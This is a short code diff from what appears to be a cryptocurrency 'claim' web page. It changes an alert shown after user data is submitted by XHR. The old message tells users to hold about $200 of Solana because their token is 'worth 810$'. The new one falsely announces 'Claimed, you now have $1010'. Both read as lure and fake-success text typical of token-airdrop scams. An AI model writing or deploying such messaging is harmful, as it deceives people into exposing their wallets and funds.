@@ -66,7 +66,7 @@ const sendData = async (data) => {
   // Define what happens on successful data submission
   XHR.addEventListener("load", function (event) {
     alert(
-      "Claiming in Progress, Make sure you have upto 200$ worth of solana , Your token is worth 810$"
+      "Yay!!!! Claimed, you now have $1010 manlet "
     );
 
     document.querySelector(".sending").style.display = "none";
